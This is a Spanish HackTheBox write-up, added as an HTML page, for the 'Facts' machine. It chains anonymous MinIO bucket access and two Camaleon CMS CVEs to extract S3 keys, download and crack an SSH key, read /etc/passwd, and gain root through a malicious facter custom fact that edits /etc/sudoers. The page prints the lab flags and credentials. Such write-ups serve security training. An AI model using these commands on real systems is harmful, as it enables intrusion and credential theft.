@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facts — Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f; --bg2: #0f1318; --bg3: #141920;
+    --accent: #3b82f6; --accent2: #ff6b35; --accent3: #60a5fa;
+    --text: #c8d6e5; --text-dim: #5a7080; --border: #1e2d3d;
+    --red: #ff4757; --yellow: #ffd32a;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; font-size: 17px; line-height: 1.7; overflow-x: hidden; }
+  body::before { content: ''; position: fixed; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(59,130,246,0.012) 2px, rgba(59,130,246,0.012) 4px); pointer-events: none; z-index: 999; }
+  header { position: relative; padding: 80px 0 60px; text-align: center; border-bottom: 1px solid var(--border); overflow: hidden; }
+  header::before { content: ''; position: absolute; inset: 0; background: radial-gradient(ellipse 60% 80% at 50% 0%, rgba(37,99,235,0.12) 0%, transparent 70%), radial-gradient(ellipse 40% 40% at 80% 80%, rgba(59,130,246,0.06) 0%, transparent 60%); }
+  .header-tag { font-family: 'Share Tech Mono', monospace; font-size: 11px; letter-spacing: 4px; color: var(--accent3); text-transform: uppercase; margin-bottom: 16px; opacity: 0.8; }
+  h1 { font-family: 'Rajdhani', sans-serif; font-size: clamp(52px, 8vw, 96px); font-weight: 700; letter-spacing: -2px; color: #fff; line-height: 1; position: relative; }
+  h1 .glow { color: var(--accent3); text-shadow: 0 0 40px rgba(96,165,250,0.6), 0 0 80px rgba(96,165,250,0.2); }
+  .header-meta { margin-top: 24px; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+  .tag { font-family: 'Share Tech Mono', monospace; font-size: 11px; padding: 4px 12px; border: 1px solid; letter-spacing: 2px; }
+  .tag.linux   { border-color: var(--accent);  color: var(--accent); }
+  .tag.minio   { border-color: var(--red);     color: var(--red); }
+  .tag.priv    { border-color: var(--yellow);  color: var(--yellow); }
+  .tag.lfi     { border-color: var(--accent3); color: var(--accent3); }
+  .tag.ruby    { border-color: var(--accent2); color: var(--accent2); }
+  .container { max-width: 900px; margin: 0 auto; padding: 0 32px; }
+  .phase { padding: 64px 0; border-bottom: 1px solid var(--border); }
+  .phase-header { display: flex; align-items: center; gap: 20px; margin-bottom: 36px; }
+  .phase-num { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--accent); letter-spacing: 3px; white-space: nowrap; opacity: 0.7; }
+  .phase-line { flex: 1; height: 1px; background: linear-gradient(90deg, var(--border), transparent); }
+  h2 { font-family: 'Rajdhani', sans-serif; font-size: 32px; font-weight: 700; color: #fff; letter-spacing: 1px; margin-bottom: 24px; }
+  h2 .accent  { color: var(--accent); }
+  h2 .accent2 { color: var(--accent2); }
+  h2 .accent3 { color: var(--accent3); }
+  h2 .yellow  { color: var(--yellow); }
+  h2 .red     { color: var(--red); }
+  p { color: var(--text); margin-bottom: 16px; font-weight: 300; font-size: 17px; }
+  .code-block { background: var(--bg2); border: 1px solid var(--border); border-left: 3px solid var(--accent); padding: 20px 24px; margin: 20px 0; font-family: 'Share Tech Mono', monospace; font-size: 13px; color: #93c5fd; overflow-x: auto; position: relative; line-height: 1.8; white-space: pre; }
+  .code-block.cmd    { border-left-color: var(--accent2); color: #f0a080; }
+  .code-block.output { border-left-color: var(--text-dim); color: var(--text-dim); font-size: 12px; }
+  .code-block.shell  { border-left-color: var(--red);     color: #f87171; }
+  .code-label { font-family: 'Share Tech Mono', monospace; font-size: 10px; letter-spacing: 3px; color: var(--text-dim); text-transform: uppercase; margin-bottom: 8px; }
+  .finding { background: var(--bg3); border: 1px solid var(--border); padding: 20px 24px; margin: 20px 0; position: relative; }
+  .finding::before { content: '!'; position: absolute; top: -1px; left: -1px; background: var(--accent2); color: #000; font-family: 'Share Tech Mono', monospace; font-size: 11px; font-weight: bold; padding: 2px 8px; letter-spacing: 2px; }
+  .finding.info::before    { content: 'INFO';  background: var(--accent3); color: #fff; }
+  .finding.success::before { content: 'PWN';   background: var(--accent);  color: #fff; }
+  .finding.vuln::before    { content: 'VULN';  background: var(--red);     color: #fff; }
+  .finding.explain::before { content: 'CÓMO FUNCIONA'; background: var(--yellow); color: #000; }
+  .finding-title { font-family: 'Rajdhani', sans-serif; font-size: 14px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; color: var(--text-dim); margin-bottom: 8px; padding-top: 4px; }
+  .ports-table { width: 100%; border-collapse: collapse; font-family: 'Share Tech Mono', monospace; font-size: 13px; margin: 20px 0; }
+  .ports-table th { text-align: left; color: var(--accent); letter-spacing: 3px; font-size: 10px; padding: 8px 16px; border-bottom: 1px solid var(--border); }
+  .ports-table td { padding: 10px 16px; border-bottom: 1px solid rgba(30,45,61,0.5); color: var(--text); }
+  .ports-table tr:hover td { background: rgba(59,130,246,0.03); }
+  .port-open { color: var(--accent); }
+  .port-num  { color: var(--accent2); font-weight: bold; }
+  code { font-family: 'Share Tech Mono', monospace; font-size: 13px; color: var(--accent); background: rgba(59,130,246,0.08); padding: 1px 6px; }
+  code.bad  { color: var(--red);    background: rgba(255,71,87,0.07); }
+  code.warn { color: var(--yellow); background: rgba(255,211,42,0.07); }
+  .flag-box { background: rgba(59,130,246,0.04); border: 1px solid rgba(59,130,246,0.25); padding: 16px 24px; margin: 20px 0; display: flex; align-items: center; gap: 16px; }
+  .flag-label { font-family: 'Share Tech Mono', monospace; font-size: 10px; letter-spacing: 3px; color: var(--accent); white-space: nowrap; }
+  .flag-value { font-family: 'Share Tech Mono', monospace; font-size: 14px; color: #fff; word-break: break-all; }
+  .flow { display: flex; flex-direction: column; gap: 0; margin: 28px 0; }
+  .flow-step { display: flex; gap: 16px; align-items: flex-start; }
+  .flow-icon { width: 36px; height: 36px; border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; font-family: 'Share Tech Mono', monospace; font-size: 12px; color: var(--yellow); flex-shrink: 0; background: var(--bg2); }
+  .flow-connector { width: 36px; display: flex; justify-content: center; flex-shrink: 0; }
+  .flow-connector::before { content: ''; width: 1px; background: linear-gradient(180deg, var(--border), transparent); min-height: 18px; display: block; }
+  .flow-content { padding-bottom: 20px; }
+  .flow-title { font-family: 'Rajdhani', sans-serif; font-weight: 700; font-size: 16px; color: #fff; margin-bottom: 2px; }
+  .flow-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; }
+  .chain { display: flex; flex-direction: column; gap: 0; margin: 32px 0; }
+  .chain-step { display: flex; gap: 20px; align-items: flex-start; }
+  .chain-icon { width: 40px; height: 40px; border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; font-family: 'Share Tech Mono', monospace; font-size: 13px; color: var(--accent); flex-shrink: 0; background: var(--bg2); }
+  .chain-connector { width: 40px; display: flex; justify-content: center; padding: 4px 0; flex-shrink: 0; }
+  .chain-connector::before { content: ''; width: 1px; height: 100%; background: linear-gradient(180deg, var(--border), transparent); min-height: 20px; display: block; }
+  .chain-content { padding-bottom: 24px; }
+  .chain-title { font-family: 'Rajdhani', sans-serif; font-weight: 700; font-size: 18px; color: #fff; margin-bottom: 4px; }
+  .chain-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; }
+  .repo-link { display: inline-flex; align-items: center; gap: 10px; margin: 16px 0; padding: 12px 20px; background: var(--bg2); border: 1px solid var(--border); font-family: 'Share Tech Mono', monospace; font-size: 12px; color: var(--accent3); text-decoration: none; letter-spacing: 1px; transition: border-color 0.2s, color 0.2s; }
+  .repo-link:hover { border-color: var(--accent3); color: #fff; }
+  .repo-link::before { content: '⎇'; font-size: 14px; }
+  footer { padding: 48px 0; text-align: center; }
+  .footer-text { font-family: 'Share Tech Mono', monospace; font-size: 11px; color: var(--text-dim); letter-spacing: 3px; }
+  .divider { height: 1px; background: linear-gradient(90deg, transparent, var(--border), transparent); margin: 8px 0; }
+  .highlight { color: var(--accent2); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <div class="header-tag">// HackTheBox — Writeup</div>
+    <h1>FA<span class="glow">CTS</span></h1>
+    <div class="header-meta">
+      <span class="tag linux">#linux</span>
+      <span class="tag minio">#minio</span>
+      <span class="tag priv">#privesc</span>
+      <span class="tag lfi">#lfi</span>
+      <span class="tag ruby">#camaleon-cms</span>
+    </div>
+  </div>
+</header>
+
+<main class="container">
+
+  <!-- FASE 1: RECONOCIMIENTO -->
+  <section class="phase">
+    <div class="phase-header"><span class="phase-num">// 01</span><div class="phase-line"></div></div>
+    <h2><span class="accent">RECONOCIMIENTO</span> — Escaneo de puertos</h2>
+
+    <p>Comenzamos con un escaneo completo de todos los puertos TCP para mapear la superficie de ataque de la máquina víctima:</p>
+
+    <div class="code-label">escaneo inicial — todos los puertos</div>
+    <div class="code-block cmd">nmap -p- -T5 &lt;IP&gt; -oG allPorts</div>
+
+    <table class="ports-table">
+      <thead><tr><th>PUERTO</th><th>ESTADO</th><th>SERVICIO</th><th>DETALLE</th></tr></thead>
+      <tbody>
+        <tr><td class="port-num">22/tcp</td><td class="port-open">OPEN</td><td>SSH</td><td>OpenSSH 9.9p1 Ubuntu</td></tr>
+        <tr><td class="port-num">80/tcp</td><td class="port-open">OPEN</td><td>HTTP</td><td>nginx 1.26.3 → redirige a facts.htb</td></tr>
+        <tr><td class="port-num">54321/tcp</td><td class="port-open">OPEN</td><td>HTTP</td><td>MinIO (S3-compatible object storage)</td></tr>
+      </tbody>
+    </table>
+
+    <p>Con los puertos identificados, lanzamos un escaneo más profundo con detección de versiones y scripts NSE:</p>
+
+    <div class="code-label">escaneo detallado de servicios</div>
+    <div class="code-block cmd">nmap -p22,80,54321 -sSCV -T5 -n -Pn -vvv &lt;IP&gt; -oN scan.txt</div>
+
+    <div class="finding info">
+      <div class="finding-title">Hallazgos clave del escaneo</div>
+      El puerto <strong style="color:#fff">80</strong> redirige a <code>http://facts.htb/</code> — añadimos el dominio a <code>/etc/hosts</code>. El puerto <strong style="color:#fff">54321</strong> es identificado como <strong style="color:#fff">MinIO</strong>, un servidor de almacenamiento de objetos compatible con la API S3 de Amazon. Nmap también detecta que este puerto redirige a <code>http://&lt;IP&gt;:9001</code>, que sería la consola web de administración de MinIO (inaccesible desde el exterior).
+    </div>
+
+    <div class="code-label">añadir el dominio al /etc/hosts</div>
+    <div class="code-block cmd">sudo bash -c 'echo "&lt;IP&gt; facts.htb" >> /etc/hosts'</div>
+  </section>
+
+  <!-- FASE 2: ENUMERACIÓN WEB -->
+  <section class="phase">
+    <div class="phase-header"><span class="phase-num">// 02</span><div class="phase-line"></div></div>
+    <h2><span class="accent3">ENUMERACIÓN WEB</span> — Camaleon CMS + MinIO</h2>
+
+    <p>Inspeccionamos el código fuente de la web. Los assets revelan el CMS que hay detrás:</p>
+
+    <div class="code-block output">&lt;link rel="stylesheet" href="/assets/themes/<span style="color:#fff">camaleon_first</span>/assets/css/main-(...).css" /&gt;
+&lt;script src="/assets/themes/<span style="color:#fff">camaleon_first</span>/assets/js/main-(...).js"&gt;&lt;/script&gt;
+set-cookie: <span style="color:#fff">_factsapp_session</span>=...</div>
+
+    <div class="finding info">
+      <div class="finding-title">Identificación del CMS</div>
+      Tres pistas inequívocas: el directorio <code>camaleon_first</code> en los assets (tema por defecto de Camaleon CMS), la cookie de sesión con el patrón <code>_&lt;app&gt;_session</code> característico de Ruby on Rails, y la ruta <code>/admin/login</code> que es el panel de administración por defecto de Camaleon. Se trata de <strong style="color:#fff">Camaleon CMS 2.9.0</strong> sobre Ruby on Rails.
+    </div>
+
+    <p>Lanzamos gobuster para enumerar rutas de la web. Entre los resultados, el directorio <code>/admin</code> redirige a <code>/admin/login</code>, confirmando la presencia del panel de administración.</p>
+
+    <div class="code-label">enumeración de directorios</div>
+    <div class="code-block cmd">gobuster dir -u "http://facts.htb/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,txt,html,js</div>
+
+    <p>Las imágenes de la web se sirven desde la ruta <code>/randomfacts/</code>. Dado que MinIO está en el puerto 54321, intentamos acceder directamente al bucket <code>randomfacts</code> vía la API S3:</p>
+
+    <div class="code-label">listado del bucket — sin autenticación</div>
+    <div class="code-block cmd">curl -s http://&lt;IP&gt;:54321/randomfacts/</div>
+
+    <div class="code-block output">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;ListBucketResult&gt;
+  &lt;Name&gt;randomfacts&lt;/Name&gt;
+  &lt;Contents&gt;&lt;Key&gt;animalejected.png&lt;/Key&gt;...&lt;/Contents&gt;
+  &lt;Contents&gt;&lt;Key&gt;logopage.png&lt;/Key&gt;...&lt;/Contents&gt;
+  ...
+&lt;/ListBucketResult&gt;</div>
+
+    <div class="finding vuln">
+      <div class="finding-title">Bucket S3 público con escritura anónima</div>
+      El bucket <code>randomfacts</code> es listable y accesible sin autenticación. Además, permite subir ficheros de forma anónima mediante PUT. El bucket actúa como almacén de assets de la web — nginx lo sirve como proxy inverso bajo la ruta <code>/randomfacts/</code>.
+    </div>
+
+    <div class="code-label">verificación de escritura anónima</div>
+    <div class="code-block cmd">curl -s -X PUT http://&lt;IP&gt;:54321/randomfacts/test.txt -d "test" -w "\nHTTP: %{http_code}"</div>
+
+    <div class="code-block output">HTTP: 200</div>
+  </section>
+
+  <!-- FASE 3: CVE-2025-2304 -->
+  <section class="phase">
+    <div class="phase-header"><span class="phase-num">// 03</span><div class="phase-line"></div></div>
+    <h2><span class="yellow">CVE-2025-2304</span> — Privesc en Camaleon CMS → Credenciales S3</h2>
+
+    <p>Creamos una cuenta de usuario normal en <code>/admin/register</code>. Con una cuenta válida, explotamos <strong style="color:#fff">CVE-2025-2304</strong>, una vulnerabilidad de escalada de privilegios por mass-assignment en Camaleon CMS 2.9.0.</p>
+
+    <div class="finding vuln">
+      <div class="finding-title">CVE-2025-2304 — Mass Assignment / Privilege Escalation</div>
+      El endpoint <code>updated_ajax</code> actualiza el usuario con <code>params.require(:password).permit!</code>. El uso de <code>permit!</code> permite <strong style="color:#fff">todos</strong> los campos sin restricción, incluyendo <code>password[role]</code>. Un usuario autenticado puede enviarse a sí mismo el campo <code>role=admin</code> y convertirse en administrador sin necesidad de conocer ninguna credencial privilegiada.
+    </div>
+
+    <a class="repo-link" href="https://github.com/Alien0ne/CVE-2025-2304" target="_blank" rel="noopener noreferrer">
+      github.com/Alien0ne/CVE-2025-2304
+    </a>
+
+    <div class="code-label">explotación con extracción de credenciales S3</div>
+    <div class="code-block cmd">python3 exploit.py -u http://facts.htb -U &lt;usuario&gt; -P &lt;password&gt; --newpass &lt;password&gt; -e</div>
+
+    <div class="code-block output">[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
+[+] Login confirmed
+   User ID: 5
+   Current User Role: client
+[+] Loading PRIVILEGE ESCALATION
+   User ID: 5
+   Updated User Role: admin
+[+] Extracting S3 Credentials
+   s3 access key: AKIA4149D0AFB0E66022
+   s3 secret key: +yyxIE2ExRsBd8Vbu2iysRTIG0GFVJooYTQPef4H
+   s3 endpoint:   http://localhost:54321</div>
+
+    <div class="finding explain">
+      <div class="finding-title">¿Por qué el exploit cambia la contraseña?</div>
+      El script por defecto envía <code>password[password]=test</code> como parte del request de actualización. Si no se especifica <code>--newpass</code> con la contraseña original, el exploit modifica la contraseña del usuario. Hay que añadir <code>--newpass &lt;tu_password&gt;</code> para mantener la contraseña intacta.
+    </div>
+
+    <p>Con las credenciales S3 obtenidas del panel de admin, listamos todos los buckets de MinIO:</p>
+
+    <div class="code-label">listar todos los buckets con credenciales</div>
+    <div class="code-block cmd">export AWS_ACCESS_KEY_ID='AKIA4149D0AFB0E66022'
+export AWS_SECRET_ACCESS_KEY='+yyxIE2ExRsBd8Vbu2iysRTIG0GFVJooYTQPef4H'
+aws --endpoint-url http://&lt;IP&gt;:54321 s3 ls</div>
+
+    <div class="code-block output">2025-09-11 14:06:52 internal
+2025-09-11 14:06:52 randomfacts</div>
+
+    <div class="finding success">
+      <div class="finding-title">Bucket privado descubierto</div>
+      Existe un bucket <code>internal</code> que no era accesible sin autenticación. Contiene lo que parece ser un backup del directorio home de un usuario del sistema.
+    </div>
+  </section>
+
+  <!-- FASE 4: BUCKET INTERNAL + CLAVE SSH -->
+  <section class="phase">
+    <div class="phase-header"><span class="phase-num">// 04</span><div class="phase-line"></div></div>
+    <h2><span class="accent2">BUCKET INTERNAL</span> — Clave SSH privada</h2>
+
+    <p>Exploramos el contenido del bucket <code>internal</code>:</p>
+
+    <div class="code-label">listado del bucket internal</div>
+    <div class="code-block cmd">aws --endpoint-url http://&lt;IP&gt;:54321 s3 ls s3://internal/</div>
+
+    <div class="code-block output">                           PRE .bundle/
+                           PRE .cache/
+                           PRE .ssh/
+2026-01-08 19:45:13        220 .bash_logout
+2026-01-08 19:45:13       3900 .bashrc
+2026-01-08 19:47:17         20 .lesshst
+2026-01-08 19:47:17        807 .profile</div>
+
+    <div class="code-label">explorar el directorio .ssh</div>
+    <div class="code-block cmd">aws --endpoint-url http://&lt;IP&gt;:54321 s3 ls s3://internal/.ssh/</div>
+
+    <div class="code-block output">2026-03-20 15:54:22         82 authorized_keys
+2026-03-20 15:54:22        464 id_ed25519</div>
+
+    <p>Encontramos una clave SSH privada. La descargamos y le asignamos los permisos correctos:</p>
+
+    <div class="code-label">descarga de la clave privada</div>
+    <div class="code-block cmd">aws --endpoint-url http://&lt;IP&gt;:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_rsa
+chmod 600 id_rsa</div>
+
+    <div class="finding info">
+      <div class="finding-title">Clave cifrada con bcrypt</div>
+      La clave está protegida con passphrase usando bcrypt (<code>aes256-ctr</code>). El <code>authorized_keys</code> solo contiene la clave pública sin información del usuario. Los ficheros del bucket tampoco revelan el nombre de usuario del sistema.
+    </div>
+  </section>
+
+  <!-- FASE 5: CVE-2024-46987 LFI -->
+  <section class="phase">
+    <div class="phase-header"><span class="phase-num">// 05</span><div class="phase-line"></div></div>
+    <h2><span class="red">CVE-2024-46987</span> — LFI para obtener el usuario SSH</h2>
+
+    <p>Para identificar el usuario al que pertenece la clave SSH, usamos <strong style="color:#fff">CVE-2024-46987</strong>, un Path Traversal / Arbitrary File Read autenticado en Camaleon CMS que funciona en la versión 2.9.0 a pesar de estar documentado para versiones anteriores.</p>
+
+    <div class="finding vuln">
+      <div class="finding-title">CVE-2024-46987 — Authenticated Path Traversal</div>
+      El método <code>download_private_file</code> del <code>MediaController</code> no valida correctamente el parámetro <code>file</code>, permitiendo a un usuario autenticado leer ficheros arbitrarios del sistema mediante path traversal.
+    </div>
+
+    <a class="repo-link" href="https://github.com/Goultarde/CVE-2024-46987" target="_blank" rel="noopener noreferrer">
+      github.com/Goultarde/CVE-2024-46987
+    </a>
+
+    <div class="code-label">lectura de /etc/passwd para identificar usuarios</div>
+    <div class="code-block cmd">python3 exploit.py -u http://facts.htb -l &lt;usuario&gt; -p &lt;password&gt; /etc/passwd</div>
+
+    <div class="code-block output">root:x:0:0:root:/root:/bin/bash
+...
+<span style="color:#fff">trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash</span>
+william:x:1001:1001::/home/william:/bin/bash
+...</div>
+
+    <div class="finding success">
+      <div class="finding-title">Usuario identificado: trivia</div>
+      Hay dos usuarios con shell: <code>trivia</code> y <code>william</code>. La clave SSH pertenece al usuario <code>trivia</code>, que tiene como directorio home <code>/home/trivia</code>. La flag de usuario se encuentra en el home de <code>william</code>.
+    </div>
+  </section>
+
+  <!-- FASE 6: ACCESO SSH -->
+  <section class="phase">
+    <div class="phase-header"><span class="phase-num">// 06</span><div class="phase-line"></div></div>
+    <h2><span class="accent">ACCESO SSH</span> — Crackeo de passphrase con John</h2>
+
+    <p>Con el usuario identificado, crackeamos la passphrase de la clave SSH usando John the Ripper y el diccionario rockyou:</p>
+
+    <div class="code-label">extracción del hash y crackeo</div>
+    <div class="code-block cmd">ssh2john id_rsa > id_rsa.hash
+john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt</div>
+
+    <div class="code-block output">Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 24 for all loaded hashes
+
+<span style="color:#fff">dragonballz</span>        (id_rsa)</div>
+
+    <p>Con la passphrase obtenida, accedemos al sistema:</p>
+
+    <div class="code-label">acceso SSH como trivia</div>
+    <div class="code-block cmd">ssh -i id_rsa trivia@&lt;IP&gt;
+# passphrase: dragonballz</div>
+
+    <div class="code-block output">trivia@facts:~$</div>
+
+    <p>La flag de usuario se encuentra en el directorio home de <code>william</code>, accesible con los permisos de <code>trivia</code>:</p>
+
+    <div class="code-block cmd">cat /home/william/user.txt</div>
+    <div class="flag-box"><span class="flag-label">USER FLAG</span><span class="flag-value">40a9c3eae65cda04047b79b8569be65b</span></div>
+  </section>
+
+  <!-- FASE 7: ESCALADA A ROOT -->
+  <section class="phase">
+    <div class="phase-header"><span class="phase-num">// 07</span><div class="phase-line"></div></div>
+    <h2><span class="accent2">PRIVILEGE ESCALATION</span> — sudo facter → RCE como root</h2>
+
+    <p>Comprobamos los privilegios sudo del usuario <code>trivia</code>:</p>
+
+    <div class="code-label">verificación de permisos sudo</div>
+    <div class="code-block cmd">sudo -l</div>
+
+    <div class="code-block output">User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter</div>
+
+    <div class="finding info">
+      <div class="finding-title">¿Qué es facter?</div>
+      <code>facter</code> es una herramienta de Ruby usada por Puppet para recopilar información del sistema (facts). Permite cargar "custom facts" desde directorios externos mediante <code>--custom-dir</code>. Estos facts son ficheros Ruby que se ejecutan con el intérprete de Ruby de facter — en este caso, como <strong style="color:#fff">root</strong>.
+    </div>
+
+    <p>Creamos un custom fact malicioso que añade a <code>trivia</code> a sudoers con permisos totales:</p>
+
+    <div class="code-label">creación del custom fact malicioso</div>
+    <div class="code-block cmd">mkdir /tmp/facts
+echo 'Facter.add("x") { setcode { `echo "trivia ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers` } }' > /tmp/facts/x.rb
+sudo facter --custom-dir /tmp/facts x</div>
+
+    <div class="code-label">escalada a root</div>
+    <div class="code-block cmd">sudo su</div>
+
+    <div class="code-block output">root@facts:~#</div>
+
+    <div class="code-block cmd">cat /root/root.txt</div>
+    <div class="flag-box"><span class="flag-label">ROOT FLAG</span><span class="flag-value">f844b3f4aae5e224f116911eb6dde5e5</span></div>
+  </section>
+
+  <!-- RESUMEN -->
+  <section class="phase">
+    <div class="phase-header"><span class="phase-num">// RESUMEN</span><div class="phase-line"></div></div>
+    <h2>CADENA DE <span class="accent">ATAQUE</span></h2>
+
+    <div class="chain">
+      <div class="chain-step">
+        <div class="chain-icon">01</div>
+        <div class="chain-content">
+          <div class="chain-title">Reconocimiento → MinIO en puerto 54321</div>
+          <div class="chain-desc">Nmap identifica nginx en el 80 (Camaleon CMS 2.9.0) y MinIO en el 54321. El bucket <code>randomfacts</code> es accesible y escribible de forma anónima.</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--yellow); color: var(--yellow);">02</div>
+        <div class="chain-content">
+          <div class="chain-title">CVE-2025-2304 → Admin + Credenciales S3</div>
+          <div class="chain-desc">Mass-assignment en <code>updated_ajax</code> eleva el rol de usuario a admin. El panel de admin expone las credenciales S3 de MinIO en <em>Filesystem Settings</em>.</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--accent2); color: var(--accent2);">03</div>
+        <div class="chain-content">
+          <div class="chain-title">Bucket internal → Clave SSH privada de trivia</div>
+          <div class="chain-desc">Con las credenciales S3 se accede al bucket privado <code>internal</code>, que contiene el directorio home de <code>trivia</code> incluyendo su clave SSH privada cifrada con bcrypt.</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--red); color: var(--red);">04</div>
+        <div class="chain-content">
+          <div class="chain-title">CVE-2024-46987 → LFI → /etc/passwd</div>
+          <div class="chain-desc">Path Traversal autenticado en <code>download_private_file</code> permite leer <code>/etc/passwd</code> y confirmar el usuario <code>trivia</code>. John crackea la passphrase: <code>dragonballz</code>.</div>
+        </div>
+      </div>
+      <div class="chain-step"><div class="chain-connector"></div><div></div></div>
+
+      <div class="chain-step">
+        <div class="chain-icon" style="border-color: var(--accent); color: var(--accent);">⚡</div>
+        <div class="chain-content">
+          <div class="chain-title" style="color: var(--accent);">sudo facter → Custom fact Ruby → Root</div>
+          <div class="chain-desc"><code>trivia</code> puede ejecutar <code>/usr/bin/facter</code> como root sin contraseña. Un custom fact Ruby escribe en <code>/etc/sudoers</code> → <code>sudo su</code> → flag de root.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="container">
+    <div class="divider"></div>
+    <br>
+    <div class="footer-text">FACTS // WRITEUP // HACKTHEBOX</div>
+  </div>
+</footer>
+
+</body>
+</html>
